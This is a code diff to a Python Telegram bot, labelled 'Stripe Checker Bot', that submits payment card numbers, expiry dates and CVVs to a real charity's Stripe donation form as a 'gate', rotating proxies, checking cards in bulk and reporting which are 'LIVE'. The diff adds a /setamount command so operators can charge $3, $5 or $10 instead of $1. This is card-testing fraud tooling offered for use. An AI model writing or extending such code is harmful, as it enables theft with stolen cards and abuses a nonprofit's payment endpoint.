@@ -24,6 +24,7 @@ from telegram.constants import ParseMode
 BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()]
 DELAY_BETWEEN = int(os.getenv("DELAY_BETWEEN", "3"))
+CHARGE_AMOUNT = os.getenv("CHARGE_AMOUNT", "1")
 GATE_URL = "https://peerchange.org/stripe-donation/"
 # Proxy from env: single proxy or comma-separated list
 # Format: http://user:pass@host:port or socks5://user:pass@host:port
@@ -271,7 +272,7 @@ def check_cc(cc: str, mm: str, yy: str, cvv: str, proxy: dict | None = None) -> 
             "action": "wpsd_donation",
             "name": "Luis ofc",
             "email": "rimagoaha@boxfi.uk",
-            "amount": "1",
+            "amount": CHARGE_AMOUNT,
             "donation_for": "Peer Driven Change",
             "currency": "USD",
             "idempotency": idem,
@@ -339,7 +340,7 @@ def check_cc(cc: str, mm: str, yy: str, cvv: str, proxy: dict | None = None) -> 
                 msg = err.get("message", "Unknown error")
                 return "DEAD", msg
         else:
-            return "LIVE", "Charged $1 ✅"
+            return "LIVE", f"Charged ${CHARGE_AMOUNT} ✅"
 
     except Exception as e:
         return "ERROR", str(e)[:100]
@@ -357,7 +358,7 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"👋 <b>Welcome, {user.first_name}!</b>\n\n"
         f"🔥 <b>Stripe Checker Bot</b>\n"
         f"├ Gate: <code>peerchange.org</code>\n"
-        f"├ Amount: <code>$1 USD</code>\n"
+        f"├ Amount: <code>${CHARGE_AMOUNT} USD</code>\n"
         f"├ Delay: <code>{DELAY_BETWEEN}s</code>\n"
         f"└ Proxy: {proxy_manager.status_text}\n\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
@@ -365,6 +366,8 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"/chk <code>cc|mm|yy|cvv</code> — Check single CC\n"
         f"/stop — Stop running bulk check\n"
         f"/status — Bot status\n\n"
+        f"💰 <b>Settings:</b>\n"
+        f"/setamount <code>5</code> — Set charge amount\n\n"
         f"🌐 <b>Proxy:</b>\n"
         f"/proxy — View proxy status\n"
         f"/setproxy <code>url</code> — Set proxy\n"
@@ -394,7 +397,7 @@ async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📊 <b>Bot Status</b>\n\n"
         f"├ Status: {status_emoji}\n"
         f"├ Gate: <code>peerchange.org</code>\n"
-        f"├ Amount: <code>$1 USD</code>\n"
+        f"├ Amount: <code>${CHARGE_AMOUNT} USD</code>\n"
         f"├ Delay: <code>{DELAY_BETWEEN}s</code>\n"
         f"├ Proxy: {proxy_manager.status_text}\n"
         f"└ Time: <code>{datetime.now().strftime('%H:%M:%S')}</code>"
@@ -643,7 +646,7 @@ async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"├ Status: <b>{status}</b>\n"
         f"├ Response: <code>{result}</code>\n"
         f"├ Gate: <code>Stripe [peerchange.org]</code>\n"
-        f"├ Amount: <code>$1 USD</code>\n"
+        f"├ Amount: <code>${CHARGE_AMOUNT} USD</code>\n"
         f"└ BIN: <code>{bin_display}</code>"
     )
 
@@ -698,7 +701,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"├ Status: <b>{status}</b>\n"
             f"├ Response: <code>{result}</code>\n"
             f"├ Gate: <code>Stripe [peerchange.org]</code>\n"
-            f"├ Amount: <code>$1 USD</code>\n"
+            f"├ Amount: <code>${CHARGE_AMOUNT} USD</code>\n"
             f"└ BIN: <code>{bin_display}</code>"
         )
         await msg.edit_text(reply, parse_mode=ParseMode.HTML)
@@ -851,7 +854,7 @@ async def process_bulk(update: Update, context: ContextTypes.DEFAULT_TYPE, cc_li
                 f"├ CC: <code>{fullcc}</code>\n"
                 f"├ Response: <code>{result}</code>\n"
                 f"├ Gate: <code>Stripe [peerchange.org]</code>\n"
-                f"├ Amount: <code>$1 USD</code>\n"
+                f"├ Amount: <code>${CHARGE_AMOUNT} USD</code>\n"
                 f"├ BIN: <code>{bin_display}</code>\n"
                 f"├ Proxy: <code>{proxy_url_display}</code>\n"
                 f"└ [{i}/{total}]",
@@ -908,6 +911,44 @@ async def process_bulk(update: Update, context: ContextTypes.DEFAULT_TYPE, cc_li
     await status_msg.edit_text(summary, parse_mode=ParseMode.HTML)
 
 
+async def cmd_setamount(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Set charge amount."""
+    global CHARGE_AMOUNT
+    user_id = update.effective_user.id
+    if not is_authorized(user_id):
+        return
+
+    if not context.args:
+        await update.message.reply_text(
+            f"💰 <b>Current Amount:</b> <code>${CHARGE_AMOUNT} USD</code>\n\n"
+            f"<b>Usage:</b>\n"
+            f"/setamount <code>3</code> — Set to $3\n"
+            f"/setamount <code>5</code> — Set to $5\n"
+            f"/setamount <code>10</code> — Set to $10",
+            parse_mode=ParseMode.HTML,
+        )
+        return
+
+    try:
+        new_amount = context.args[0].strip().replace("$", "")
+        # Validate it's a valid number
+        float(new_amount)
+        old_amount = CHARGE_AMOUNT
+        CHARGE_AMOUNT = new_amount
+        logger.info(f"💰 Amount changed: ${old_amount} → ${CHARGE_AMOUNT}")
+        await update.message.reply_text(
+            f"💰 <b>Amount Updated!</b>\n\n"
+            f"├ Old: <code>${old_amount} USD</code>\n"
+            f"└ New: <code>${CHARGE_AMOUNT} USD</code>",
+            parse_mode=ParseMode.HTML,
+        )
+    except ValueError:
+        await update.message.reply_text(
+            "❌ Invalid amount. Use a number, e.g. /setamount <code>5</code>",
+            parse_mode=ParseMode.HTML,
+        )
+
+
 async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -921,7 +962,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"📊 <b>Bot Status</b>\n\n"
             f"├ Status: {status_emoji}\n"
             f"├ Gate: <code>peerchange.org</code>\n"
-            f"├ Amount: <code>$1 USD</code>\n"
+            f"├ Amount: <code>${CHARGE_AMOUNT} USD</code>\n"
             f"├ Delay: <code>{DELAY_BETWEEN}s</code>\n"
             f"├ Proxy: {proxy_manager.status_text}\n"
             f"└ Time: <code>{datetime.now().strftime('%H:%M:%S')}</code>"
@@ -946,6 +987,7 @@ def main():
     app.add_handler(CommandHandler("setproxy", cmd_setproxy))
     app.add_handler(CommandHandler("checkproxy", cmd_checkproxy))
     app.add_handler(CommandHandler("clearproxy", cmd_clearproxy))
+    app.add_handler(CommandHandler("setamount", cmd_setamount))
 
     # Document handler (for .txt files)
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
